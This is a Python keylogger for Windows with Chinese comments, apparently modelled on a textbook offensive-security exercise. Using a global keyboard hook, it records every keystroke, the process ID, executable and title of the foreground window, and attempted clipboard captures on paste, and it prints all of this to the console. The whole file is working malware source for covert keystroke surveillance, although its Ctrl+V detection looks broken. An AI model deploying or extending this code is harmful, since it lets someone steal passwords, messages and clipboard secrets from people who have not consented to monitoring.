from ctypes import windll, c_ulong, create_string_buffer, byref
import pythoncom
from pynput import keyboard
import win32clipboard

# 初始化 Windows API 动态链接库
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi

# 全局变量，用于跟踪当前窗口
current_window = None

def get_current_process():
    """
    获取当前前台窗口的进程信息，包括进程 ID、可执行文件名和窗口标题
    """
    # 获取前台窗口句柄
    hwnd = user32.GetForegroundWindow()
    
    # 获取窗口的进程 ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    
    # 格式化进程 ID
    process_id = f"{pid.value}"
    
    # 分配内存以存储可执行文件名（最大 512 字节）
    executable = create_string_buffer(b'\x00' * 512)
    
    # 打开进程句柄，获取进程信息（0x400: PROCESS_QUERY_INFORMATION, 0x10: PROCESS_VM_READ）
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    
    # 获取进程的可执行文件名
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
    
    # 分配内存以存储窗口标题（最大 512 字节）
    window_title = create_string_buffer(b'\x00' * 512)
    
    # 获取窗口标题
    user32.GetWindowTextA(hwnd, byref(window_title), 512)
    
    # 尝试解码窗口标题和可执行文件名，处理可能的编码错误
    try:
        window_title_str = window_title.value.decode('utf-8')
    except UnicodeDecodeError:
        try:
            window_title_str = window_title.value.decode('gbk')  # 尝试 GBK 编码（常见于中文 Windows）
        except UnicodeDecodeError:
            window_title_str = str(window_title.value)  # 回退到原始字节字符串
    try:
        executable_str = executable.value.decode('utf-8')
    except UnicodeDecodeError:
        executable_str = str(executable.value)  # 回退到原始字节字符串
    
    # 打印进程信息
    print()
    print(f"[ PID: {process_id} - {executable_str} - {window_title_str} ]")
    print()
    
    # 关闭进程句柄，释放资源
    kernel32.CloseHandle(h_process)

def on_press(key):
    """
    键盘按下事件的回调函数，记录按键、窗口变化和剪贴板粘贴操作
    """
    global current_window
    
    # 获取当前窗口标题
    hwnd = user32.GetForegroundWindow()
    window_title = create_string_buffer(b'\x00' * 512)
    user32.GetWindowTextA(hwnd, byref(window_title), 512)
    
    # 尝试解码窗口标题，处理可能的编码错误
    try:
        current_window_title = window_title.value.decode('utf-8')
    except UnicodeDecodeError:
        try:
            current_window_title = window_title.value.decode('gbk')  # 尝试 GBK 编码
        except UnicodeDecodeError:
            current_window_title = str(window_title.value)  # 回退到原始字节字符串
    
    # 检查窗口是否发生变化
    if current_window_title != current_window:
        current_window = current_window_title
        get_current_process()
    
    try:
        # 处理可打印字符（ASCII 33-126）
        if hasattr(key, 'char') and key.char:
            char = key.char
            if 32 < ord(char) < 127:
                print(char, end='', flush=True)
        else:
            # 处理特殊按键
            key_str = str(key).replace("Key.", "").upper()
            
            # 检测 Ctrl+V 粘贴操作
            if key_str == "V" and keyboard.Controller().pressed(keyboard.Key.ctrl):
                try:
                    win32clipboard.OpenClipboard()
                    pasted_value = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()
                    print(f"[PASTE] - {pasted_value}")
                except Exception as e:
                    print(f"[PASTE ERROR] - {e}")
            else:
                print(f"[{key_str}]")
    
    except Exception as e:
        print(f"[ERROR] - {e}")
    
    return True

def main():
    """
    主函数，设置键盘监听并启动消息循环
    """
    # 创建键盘监听器
    with keyboard.Listener(on_press=on_press) as listener:
        # 进入消息循环，保持程序运行
        pythoncom.PumpMessages()

if __name__ == "__main__":
    main()